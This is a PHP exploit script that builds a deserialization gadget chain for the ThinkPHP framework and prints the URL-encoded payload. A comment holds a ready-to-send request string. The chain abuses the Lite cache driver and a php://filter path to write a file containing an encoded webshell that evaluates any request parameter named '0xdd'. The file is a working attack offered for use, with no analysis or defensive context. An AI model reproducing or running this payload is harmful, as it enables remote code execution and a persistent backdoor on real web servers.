<?php

/*payload urlencode*/
/*0xdd*/

/*1.php?value=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A6%3A%22parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CLite%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A133%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DdddPD9waHAgQGV2YWwoJF9SRVFVRVNUWycweGRkJ10pOz8%2BIA%3D%3D%2F..%2F0xdd.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A12%3A%22session_name%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22expire%22%3BN%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7Ds%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A8%3A%22getError%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A30%3A%22think%5Cmodel%5Crelation%5CBelongsTo%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A4%3A%220xdd%22%3B%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CLite%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A0%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A133%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DdddPD9waHAgQGV2YWwoJF9SRVFVRVNUWycweGRkJ10pOz8%2BIA%3D%3D%2F..%2F0xdd.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A12%3A%22session_name%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22expire%22%3BN%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7D%7D%7D%7D*/
/*use Class Lite write shell  (touch bug is normal)*/

namespace think\process\pipes;
abstract class Pipes
{
}
use think\model\Pivot;
class Windows extends Pipes
{
    private $files = [];

    function __construct()
    {
        $this->files = [new Pivot()];
    }
}



namespace think;
abstract class Model
{
    protected $append = [];
    protected $error;
    protected $parent;
}



namespace think\model;
use think\Model;
use think\console\Output;
use think\model\relation\BelongsTo;

class Pivot extends Model
{
    public $parent;

    function __construct()
    {
        $this->append = ["getError" => "getError"];
        $this->parent = new Output();
        $this->error = new BelongsTo();
    }
}


namespace think\db;
use think\console\Output;
class Query
{
    protected $model;

    function __construct()
    {
        $this->model = new Output();
    }
}


namespace think\model;
abstract class Relation
{
    protected $selfRelation;
    protected $query;
}


namespace think\model\relation;
use think\model\Relation;
abstract class OneToOne extends Relation
{
    protected $bindAttr = [];
}
use think\db\Query;
class BelongsTo extends OneToOne
{
    function __construct()
    {
        $this->selfRelation = false;
        $this->query = new Query();
        $this->bindAttr = [1 => "0xdd"];
    }
}

namespace think\console;
use  think\session\driver\Memcached;
class Output
{
    private $handle = null;
    protected $styles = [];

    function __construct()
    {
        $this->handle = new Memcached();
        $this->styles = ["getAttr"];
    }
}

namespace think\session\driver;
use think\cache\driver\Lite;
class Memcached
{
    protected $handler = null;
    protected $config = [];

    function __construct()
    {
        $this->handler = new Lite();
        $this->config = [
            'session_name' => '',
            'expire' => null,
        ];
    }
}


namespace think\cache\driver;
class Lite
{
    protected $options = [];
    protected $tag;

    function __construct()
    {
        $this->options = [
            'expire' => 0,
            'cache_subdir' => false,
            'prefix' => '',
            'path' => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=dddPD9waHAgQGV2YWwoJF9SRVFVRVNUWycweGRkJ10pOz8+IA==/../0xdd.php',
            'data_compress' => false,
        ];
        $this->tag = true;
    }

    public function get_filename()
    {
        $name = md5('tag_' . md5($this->tag));
        $filename = $this->options['path'];
        $pos = strpos($filename, "resource=");
        $filename = urlencode(substr($filename, $pos + strlen("resource=")));
        return $filename . $name . ".php";
    }
}


use think\process\pipes\Windows;
echo urlencode(serialize(new Windows()));
echo "</br></br></br></br></br></br></br></br></br></br></br></br>";
$f = new Lite();
echo $f->get_filename();
